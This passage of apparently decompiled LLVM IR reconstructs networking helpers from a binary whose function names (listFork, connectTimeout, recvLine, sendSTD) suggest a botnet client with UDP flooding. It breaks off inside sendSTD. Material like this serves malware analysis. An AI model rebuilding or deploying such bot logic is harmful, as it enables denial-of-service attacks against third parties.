  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8b34, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8ad4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8e70, { 1, 0 }
  uselistorder label %dec_label_pc_8e54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8e38, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8e18, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8ba4, { 1, 0 }
  uselistorder label %dec_label_pc_8b30, { 1, 0 }
  uselistorder label %dec_label_pc_8abc, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8e88 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8e90 = load i32, i32* @fp, align 4
  %v10_8e90 = load i32, i32* @lr, align 4
  store i32 36504, i32* %stack_var_-16, align 4
  %v2_8e94 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8e94, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8ea0 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8eac = ptrtoint i32* %stack_var_-44 to i32
  %v14_8eb8 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8ea0, i32 %v2_8eac, i32 %arg1, i32 %v2_8ea0, i32 %v3_8e90, i32 %v1_8e88, i32 %v10_8e90, i32 36504, i32 %arg2, i32 %arg3, i32 %arg4)
  ret i32 %v14_8eb8

; uselistorder directives
  uselistorder i32 %v2_8ea0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_8ef0 = call i32 @strlen(i8* %arg1)
  %v2_8f30.pre = load i32, i32* @global_var_1f09c, align 4
  br label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8f10, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8f08, %dec_label_pc_8f10 ]
  %v2_8f1c = add i32 %stack_var_-24.0, %tmp
  %v1_8f20 = inttoptr i32 %v2_8f1c to i8*
  %v2_8f20 = load i8, i8* %v1_8f20, align 1
  %v3_8f20 = zext i8 %v2_8f20 to i32
  %v2_8f24 = mul nuw nsw i32 %v3_8f20, 2
  %v2_8f34 = add i32 %v2_8f24, %v2_8f30.pre
  %v1_8f38 = inttoptr i32 %v2_8f34 to i16*
  %v2_8f38 = load i16, i16* %v1_8f38, align 2
  %v1_8f3c = and i16 %v2_8f38, 32
  %v2_8f40 = icmp eq i16 %v1_8f3c, 0
  %v1_8f08 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8f40, label %dec_label_pc_8f58.preheader, label %dec_label_pc_8f10

dec_label_pc_8f58.preheader:                      ; preds = %dec_label_pc_8f10
  %v1_8ef8 = add i32 %v3_8ef0, -1
  %v5_8f6411 = icmp slt i32 %v1_8ef8, %stack_var_-24.0
  br i1 %v5_8f6411, label %dec_label_pc_8fe8.preheader, label %dec_label_pc_8f68

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f68
  %v1_8f50 = add i32 %stack_var_-20.012, -1
  %v5_8f64 = icmp slt i32 %v1_8f50, %stack_var_-24.0
  br i1 %v5_8f64, label %dec_label_pc_8fe8.preheader, label %dec_label_pc_8f68

dec_label_pc_8f68:                                ; preds = %dec_label_pc_8f58.preheader, %dec_label_pc_8f4c
  %stack_var_-20.012 = phi i32 [ %v1_8f50, %dec_label_pc_8f4c ], [ %v1_8ef8, %dec_label_pc_8f58.preheader ]
  %v2_8f74 = add i32 %stack_var_-20.012, %tmp
  %v1_8f78 = inttoptr i32 %v2_8f74 to i8*
  %v2_8f78 = load i8, i8* %v1_8f78, align 1
  %v3_8f78 = zext i8 %v2_8f78 to i32
  %v2_8f7c = mul nuw nsw i32 %v3_8f78, 2
  %v2_8f8c = add i32 %v2_8f7c, %v2_8f30.pre
  %v1_8f90 = inttoptr i32 %v2_8f8c to i16*
  %v2_8f90 = load i16, i16* %v1_8f90, align 2
  %v1_8f94 = and i16 %v2_8f90, 32
  %v2_8f98 = icmp eq i16 %v1_8f94, 0
  br i1 %v2_8f98, label %dec_label_pc_8fe8.preheader, label %dec_label_pc_8f4c

dec_label_pc_8fe8.preheader:                      ; preds = %dec_label_pc_8f4c, %dec_label_pc_8f68, %dec_label_pc_8f58.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8ef8, %dec_label_pc_8f58.preheader ], [ %v1_8f50, %dec_label_pc_8f4c ], [ %stack_var_-20.012, %dec_label_pc_8f68 ]
  br label %dec_label_pc_8fe8

dec_label_pc_8fac:                                ; preds = %dec_label_pc_8fe8
  %v2_8fd0 = add i32 %storemerge2, %tmp
  %v1_8fd4 = inttoptr i32 %v2_8fd0 to i8*
  %v2_8fd4 = load i8, i8* %v1_8fd4, align 1
  %v3_8fd8 = inttoptr i32 %v2_900c to i8*
  store i8 %v2_8fd4, i8* %v3_8fd8, align 1
  %v1_8fe0 = add i32 %storemerge2, 1
  br label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fe8.preheader, %dec_label_pc_8fac
  %storemerge2 = phi i32 [ %v1_8fe0, %dec_label_pc_8fac ], [ %stack_var_-24.0, %dec_label_pc_8fe8.preheader ]
  %v7_8ff4 = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_9000 = sub i32 %storemerge2, %stack_var_-24.0
  %v2_900c = add i32 %v2_9000, %tmp
  br i1 %v7_8ff4, label %dec_label_pc_8ff8, label %dec_label_pc_8fac

dec_label_pc_8ff8:                                ; preds = %dec_label_pc_8fe8
  %v3_9014 = inttoptr i32 %v2_900c to i8*
  store i8 0, i8* %v3_9014, align 1
  ret i32 %v3_8ef0

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8ef8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_8fe8, { 1, 0 }
  uselistorder label %dec_label_pc_8fe8.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8f68, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9048 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9048, i32* %arg2, align 4
  %v3_9060 = icmp eq i32 %v1_9048, -1
  %. = zext i1 %v3_9060 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_90e4.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9094 = load i32, i32* @fp, align 4
  store i32 %v3_9094, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_90bc = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_90d0 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_90e4

dec_label_pc_90e4:                                ; preds = %dec_label_pc_90e4.lr.ph, %dec_label_pc_90e4
  %storemerge527 = phi i32 [ 0, %dec_label_pc_90e4.lr.ph ], [ %v1_90f8, %dec_label_pc_90e4 ]
  %v5_90f0 = mul nuw nsw i32 %storemerge527, 4
  %v6_90f0 = add i32 %v5_90f0, %v2_90d0
  %v7_90f0 = inttoptr i32 %v6_90f0 to i32*
  store i32 0, i32* %v7_90f0, align 4
  %v1_90f8 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_90f8, 32
  br i1 %tmp52, label %dec_label_pc_90e4, label %dec_label_pc_910c

dec_label_pc_910c:                                ; preds = %dec_label_pc_90e4
  %v13_9094 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9110 = udiv i32 %arg1, 32
  %v3_911c = mul nuw nsw i32 %v3_9110, 4
  %v2_9124 = add nsw i32 %v3_911c, -160
  %v2_9128 = add i32 %v2_9124, %v13_9094
  %v1_912c = inttoptr i32 %v2_9128 to i32*
  %v2_912c = load i32, i32* %v1_912c, align 4
  %v1_9134 = urem i32 %arg1, 32
  %v6_913c = shl i32 1, %v1_9134
  %v2_9140 = or i32 %v2_912c, %v6_913c
  store i32 %v2_9140, i32* %v1_912c, align 4
  %v1_9160 = add i32 %arg1, 1
  %v2_916c = ptrtoint i32* %stack_var_-184 to i32
  %v5_9180 = call i32 @__libc_select(i32 %v1_9160, i32 %v2_90d0, i32 0, i32 %v2_90d0, i32 %v2_916c)
  %v5_9194 = icmp sgt i32 %v5_9180, 0
  br i1 %v5_9194, label %dec_label_pc_9314.preheader, label %dec_label_pc_9280.preheader

dec_label_pc_9280.preheader:                      ; preds = %dec_label_pc_910c
  %v7_928823 = icmp slt i32 %tmp33, 10
  br i1 %v7_928823, label %dec_label_pc_91c0.lr.ph, label %dec_label_pc_9314.preheader

dec_label_pc_91c0.lr.ph:                          ; preds = %dec_label_pc_9280.preheader, %dec_label_pc_9274
  %stack_var_-44.024 = phi i32 [ %v1_9278, %dec_label_pc_9274 ], [ %tmp33, %dec_label_pc_9280.preheader ]
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_91c0

dec_label_pc_91c0:                                ; preds = %dec_label_pc_91c0.lr.ph, %dec_label_pc_91c0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_91c0.lr.ph ], [ %v1_91d4, %dec_label_pc_91c0 ]
  %v5_91cc = mul nuw nsw i32 %storemerge615, 4
  %v6_91cc = add i32 %v5_91cc, %v2_90d0
  %v7_91cc = inttoptr i32 %v6_91cc to i32*
  store i32 0, i32* %v7_91cc, align 4
  %v1_91d4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_91d4, 32
  br i1 %tmp53, label %dec_label_pc_91c0, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91c0
  %v2_9208 = load i32, i32* %v1_912c, align 4
  %v2_921c = or i32 %v2_9208, %v6_913c
  store i32 %v2_921c, i32* %v1_912c, align 4
  %v5_925c = call i32 @__libc_select(i32 %v1_9160, i32 %v2_90d0, i32 0, i32 %v2_90d0, i32 %v2_916c)
  %v5_9270 = icmp sgt i32 %v5_925c, 0
  br i1 %v5_9270, label %dec_label_pc_9314.preheader, label %dec_label_pc_9274

dec_label_pc_9274:                                ; preds = %dec_label_pc_91e8
  %v1_9278 = add nsw i32 %stack_var_-44.024, 1
  %v7_9288 = icmp slt i32 %v1_9278, 10
  br i1 %v7_9288, label %dec_label_pc_91c0.lr.ph, label %dec_label_pc_9314.preheader

dec_label_pc_9314.preheader:                      ; preds = %dec_label_pc_9274, %dec_label_pc_91e8, %dec_label_pc_9280.preheader, %dec_label_pc_910c
  %v2_92a8 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_931c57 = icmp sgt i32 %arg3, 1
  %v2_933459 = icmp eq i1 %not.v7_931c57, false
  br i1 %v2_933459, label %dec_label_pc_933c, label %dec_label_pc_92a0

dec_label_pc_92a0:                                ; preds = %dec_label_pc_9314.preheader, %dec_label_pc_9308
  %v1_931862.in = phi i32 [ %v1_931862, %dec_label_pc_9308 ], [ %arg3, %dec_label_pc_9314.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_92f8, %dec_label_pc_9308 ], [ %arg2, %dec_label_pc_9314.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_930c, %dec_label_pc_9308 ], [ 0, %dec_label_pc_9314.preheader ]
  %v1_931862 = add i32 %v1_931862.in, -1
  %v2_92a4 = load i32, i32* @global_var_1f320.40, align 4
  %v5_92bc = call i32 @__libc_recv(i32 %v2_92a4, i32 %v2_92a8, i32 1, i32 0, i32 %v1_931862)
  %v7_92c4 = icmp eq i32 %v5_92bc, 1
  br i1 %v7_92c4, label %dec_label_pc_92e4, label %dec_label_pc_92cc

dec_label_pc_92cc:                                ; preds = %dec_label_pc_92a0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9350

dec_label_pc_92e4:                                ; preds = %dec_label_pc_92a0
  %v3_92e4 = load i8, i8* %stack_var_-185, align 1
  %v4_92e8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_92e4, i8* %stack_var_-40.061, align 1
  %v1_92f4 = add i32 %v4_92e8, 1
  %v5_92f8 = inttoptr i32 %v1_92f4 to i8*
  %v3_92fc = load i8, i8* %stack_var_-185, align 1
  %v7_9300 = icmp eq i8 %v3_92fc, 10
  br i1 %v7_9300, label %dec_label_pc_933c, label %dec_label_pc_9308

dec_label_pc_9308:                                ; preds = %dec_label_pc_92e4
  %v1_930c = add i32 %stack_var_-36.060, 1
  %not.v7_931c = icmp sgt i32 %v1_931862, 1
  %v2_9334 = icmp eq i1 %not.v7_931c, false
  br i1 %v2_9334, label %dec_label_pc_933c, label %dec_label_pc_92a0

dec_label_pc_933c:                                ; preds = %dec_label_pc_92e4, %dec_label_pc_9308, %dec_label_pc_9314.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9314.preheader ], [ %v1_930c, %dec_label_pc_9308 ], [ %stack_var_-36.060, %dec_label_pc_92e4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9314.preheader ], [ %v5_92f8, %dec_label_pc_9308 ], [ %v5_92f8, %dec_label_pc_92e4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_92cc, %dec_label_pc_933c
  %storemerge = phi i32 [ -1, %dec_label_pc_92cc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_933c ]
  %v2_935c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_935c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_931862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9278, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_90d0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9350, { 1, 0 }
  uselistorder label %dec_label_pc_933c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_92a0, { 1, 0 }
  uselistorder label %dec_label_pc_91c0, { 1, 0 }
  uselistorder label %dec_label_pc_91c0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_90e4, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_936c = load i32, i32* @fp, align 4
  store i32 %v3_936c, i32* %stack_var_-16, align 4
  %v13_936c = ptrtoint i32* %stack_var_-16 to i32
  %v2_9394 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_93a4 = or i32 %v2_9394, 2048
  store i32 %v1_93a4, i32* @r3, align 4
  %v2_93b8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_93cc = urem i32 %arg3, 65536
  %v1_93d4 = call i32 @__GI_htons(i32 %v3_93cc)
  %v3_93f4 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_93fc = icmp eq i32 %v3_93f4, 0
  br i1 %v2_93fc, label %dec_label_pc_9410, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  br label %dec_label_pc_95c8

dec_label_pc_9410:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9424 = bitcast i32* %stack_var_-40 to i8*
  %v3_9424 = call i32 @__GI_memset(i8* %v2_9424, i32 0)
  %v2_9428 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9438 = call i32 @__libc_connect(i32 %arg1, i32 %v2_9428, i32 16)
  store i32 %v3_9438, i32* @r3, align 4
  %v1_9448 = icmp slt i32 %v3_9438, 0
  br i1 %v1_9448, label %dec_label_pc_9450, label %dec_label_pc_958c

dec_label_pc_9450:                                ; preds = %dec_label_pc_9410
  %v0_9450 = call i32 @__GI___errno_location()
  %v1_9458 = inttoptr i32 %v0_9450 to i32*
  %v2_9458 = load i32, i32* %v1_9458, align 4
  %v7_945c = icmp eq i32 %v2_9458, 115
  br i1 %v7_945c, label %dec_label_pc_9488.lr.ph, label %dec_label_pc_9580

dec_label_pc_9488.lr.ph:                          ; preds = %dec_label_pc_9450
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9474 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9488

dec_label_pc_9488:                                ; preds = %dec_label_pc_9488.lr.ph, %dec_label_pc_9488
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9488.lr.ph ], [ %v1_949c, %dec_label_pc_9488 ]
  %v5_9494 = mul nuw nsw i32 %storemerge14, 4
  %v6_9494 = add i32 %v5_9494, %v2_9474
  %v7_9494 = inttoptr i32 %v6_9494 to i32*
  store i32 0, i32* %v7_9494, align 4
  %v1_949c = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_949c, 32
  br i1 %tmp28, label %dec_label_pc_9488, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_9488
  %v3_94b4 = udiv i32 %arg1, 32
  %v3_94c0 = mul nuw nsw i32 %v3_94b4, 4
  %v2_94c8 = add nsw i32 %v3_94c0, -160
  %v2_94cc = add i32 %v2_94c8, %v13_936c
  %v1_94d0 = inttoptr i32 %v2_94cc to i32*
  %v2_94d0 = load i32, i32* %v1_94d0, align 4
  %v1_94d8 = urem i32 %arg1, 32
  %v6_94e0 = shl i32 1, %v1_94d8
  %v2_94e4 = or i32 %v2_94d0, %v6_94e0
  store i32 %v2_94e4, i32* %v1_94d0, align 4
  %v1_9504 = add i32 %arg1, 1
  %v2_950c = ptrtoint i32* %stack_var_-184 to i32
  %v5_9524 = call i32 @__libc_select(i32 %v1_9504, i32 0, i32 %v2_9474, i32 0, i32 %v2_950c)
  %tmp29 = icmp slt i32 %v5_9524, 1
  br i1 %tmp29, label %dec_label_pc_9574, label %dec_label_pc_9534

dec_label_pc_9534:                                ; preds = %dec_label_pc_94b0
  store i32 4, i32* %stack_var_-188, align 4
  %v2_953c = ptrtoint i32* %stack_var_-192 to i32
  %v2_9540 = ptrtoint i32* %stack_var_-188 to i32
  %v5_9558 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_953c, i32 %v2_9540)
  %v3_955c = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_955c, i32* @r3, align 4
  %v2_9560 = icmp eq i32 %v3_955c, 0
  br i1 %v2_9560, label %dec_label_pc_958c, label %dec_label_pc_9568

dec_label_pc_9568:                                ; preds = %dec_label_pc_9534
  br label %dec_label_pc_95c8

dec_label_pc_9574:                                ; preds = %dec_label_pc_94b0
  br label %dec_label_pc_95c8

dec_label_pc_9580:                                ; preds = %dec_label_pc_9450
  br label %dec_label_pc_95c8

dec_label_pc_958c:                                ; preds = %dec_label_pc_9410, %dec_label_pc_9534
  %v2_9598 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_95a8 = and i32 %v2_9598, -2049
  store i32 %v1_95a8, i32* @r3, align 4
  %v2_95bc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_95c8

dec_label_pc_95c8:                                ; preds = %dec_label_pc_9580, %dec_label_pc_9574, %dec_label_pc_9568, %dec_label_pc_9404, %dec_label_pc_958c
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9574 ], [ 1, %dec_label_pc_958c ], [ 0, %dec_label_pc_9568 ], [ 0, %dec_label_pc_9580 ], [ 0, %dec_label_pc_9404 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9474, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_95c8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_958c, { 1, 0 }
  uselistorder label %dec_label_pc_9488, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @r4, align 4
  %v6_95e0 = load i32, i32* @r5, align 4
  %v9_95e0 = load i32, i32* @r6, align 4
  %v12_95e0 = load i32, i32* @fp, align 4
  store i32 38376, i32* %stack_var_-4, align 4
  %v2_95e4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_95e4, i32* @fp, align 4
  %v0_95ec = call i32 @__libc_fork()
  %v2_95fc = icmp eq i32 %v0_95ec, 0
  br i1 %v2_95fc, label %dec_label_pc_9768, label %dec_label_pc_9610

dec_label_pc_9610:                                ; preds = %entry
  %v2_9614 = load i32, i32* @global_var_1f318.42, align 4
  %v5_9614 = load i32, i32* @global_var_1f31c.43, align 4
  %v2_9620 = add i32 %v2_9614, 1
  %v3_9620 = icmp eq i32 %v2_9620, 0
  %v4_9624 = zext i1 %v3_9620 to i32
  %v5_9624 = add i32 %v4_9624, %v5_9614
  store i32 %v2_9620, i32* @global_var_1f318.42, align 4
  store i32 %v5_9624, i32* @global_var_1f31c.43, align 4
  %v2_9640 = add i32 %v2_9614, 2
  %v3_9640 = icmp eq i32 %v2_9620, -1
  %v4_9644 = zext i1 %v3_9640 to i32
  %v5_9644 = add i32 %v5_9624, %v4_9644
  %v3_9648 = udiv i32 %v2_9640, 1073741824
  %v3_964c = mul i32 %v5_9644, 4
  %v2_9650 = or i32 %v3_964c, %v3_9648
  store i32 %v2_9650, i32* @r4, align 4
  %v3_9654 = mul i32 %v2_9640, 4
  %v1_965c = call i32 @malloc(i32 %v3_9654)
  br label %dec_label_pc_96b4

dec_label_pc_9674:                                ; preds = %dec_label_pc_96b4, %dec_label_pc_9700
  %v3_9678 = mul i32 %storemerge3, 4
  %v2_9684 = add i32 %v3_9678, %v1_965c
  %v2_9698 = load i32, i32* @global_var_21568.45, align 4
  %v2_969c = add i32 %v2_9698, %v3_9678
  %v1_96a0 = inttoptr i32 %v2_969c to i32*
  %v2_96a0 = load i32, i32* %v1_96a0, align 4
  %v2_96a4 = inttoptr i32 %v2_9684 to i32*
  store i32 %v2_96a0, i32* %v2_96a4, align 4
  %v1_96ac = add i32 %storemerge3, 1
  br label %dec_label_pc_96b4

dec_label_pc_96b4:                                ; preds = %dec_label_pc_9610, %dec_label_pc_9674
  %storemerge3 = phi i32 [ 0, %dec_label_pc_9610 ], [ %v1_96ac, %dec_label_pc_9674 ]
  %v2_96cc = load i32, i32* @global_var_1f318.42, align 4
  %v5_96cc = load i32, i32* @global_var_1f31c.43, align 4
  %v2_96e0 = add i32 %v2_96cc, -1
  %v3_96e0 = icmp ne i32 %v2_96cc, 0
  %v3_96e4 = add i32 %v5_96cc, -1
  %v5_96e4 = sext i1 %v3_96e0 to i32
  %v9_96f8 = icmp eq i32 %v3_96e4, %v5_96e4
  br i1 %v9_96f8, label %dec_label_pc_9700, label %dec_label_pc_9674

dec_label_pc_9700:                                ; preds = %dec_label_pc_96b4
  store i32 %v2_96e0, i32* @r5, align 4
  store i32 %storemerge3, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_96e0, %storemerge3
  br i1 %tmp, label %dec_label_pc_9674, label %dec_label_pc_9720

dec_label_pc_9720:                                ; preds = %dec_label_pc_9700
  store i32 %v5_96cc, i32* @r4, align 4
  %v3_9728 = mul i32 %v2_96cc, 4
  %v1_972c = add i32 %v1_965c, -4
  %v2_9738 = add i32 %v1_972c, %v3_9728
  %v2_9740 = inttoptr i32 %v2_9738 to i32*
  store i32 %v0_95ec, i32* %v2_9740, align 4
  %v2_9748 = load i32, i32* @global_var_21568.45, align 4
  store i32 %v2_9748, i32* @r0, align 4
  %v0_9750 = call i32 @free()
  store i32 %v1_965c, i32* @global_var_21568.45, align 4
  br label %dec_label_pc_9768

dec_label_pc_9768:                                ; preds = %entry, %dec_label_pc_9720
  store i32 %v3_95e0, i32* @r4, align 4
  store i32 %v6_95e0, i32* @r5, align 4
  store i32 %v9_95e0, i32* @r6, align 4
  store i32 %v12_95e0, i32* @fp, align 4
  ret i32 %v0_95ec

; uselistorder directives
  uselistorder i32 %storemerge3, { 0, 2, 1, 3 }
  uselistorder i32 %v3_9678, { 1, 0 }
  uselistorder i32 %v1_965c, { 2, 0, 1 }
  uselistorder i32 %v2_9620, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9768, { 1, 0 }
  uselistorder label %dec_label_pc_96b4, { 1, 0 }
  uselistorder label %dec_label_pc_9674, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9788 = load i32, i32* @fp, align 4
  store i32 %v3_9788, i32* %stack_var_-16, align 4
  store i32 38800, i32* %stack_var_-4, align 4
  %v2_978c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_978c, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-104, align 4
  %v8_97ac = icmp sgt i32 %arg4, 4096
  br i1 %v8_97ac, label %dec_label_pc_9940, label %dec_label_pc_97b0

dec_label_pc_97b0:                                ; preds = %entry
  %v13_9788 = ptrtoint i32* %stack_var_-16 to i32
  %v3_97bc = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_97cc = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_97e0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_97ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_97ec, i32* @r0, align 4
  %v2_97f8 = call i32 @bzero(i32 %v2_97ec, i32 16)
  %v1_9800 = add i32 %v1_97e0, 16
  %v2_9800 = inttoptr i32 %v1_9800 to i32*
  %v3_9800 = load i32, i32* %v2_9800, align 4
  %v1_9804 = inttoptr i32 %v3_9800 to i32*
  %v2_9804 = load i32, i32* %v1_9804, align 4
  %v1_980c = add i32 %v1_97e0, 12
  %v2_980c = inttoptr i32 %v1_980c to i32*
  %v3_980c = load i32, i32* %v2_980c, align 4
  store i32 %v3_980c, i32* @r2, align 4
  %v2_9818 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_9818, i32* @r3, align 4
  %v4_9824 = call i32 @bcopy(i32 %v2_9804, i32 %v2_9818, i32 %v3_980c, i32 %v2_9818)
  %v1_982c = add i32 %v1_97e0, 8
  %v2_982c = inttoptr i32 %v1_982c to i32*
  %v3_982c = load i32, i32* %v2_982c, align 4
  %v3_9834 = urem i32 %v3_982c, 65536
  store i32 %v3_9834, i32* %stack_var_-56, align 4
  %v2_9890 = ptrtoint i32* %stack_var_-88 to i32
  %v2_989c = bitcast i32* %stack_var_-88 to i8*
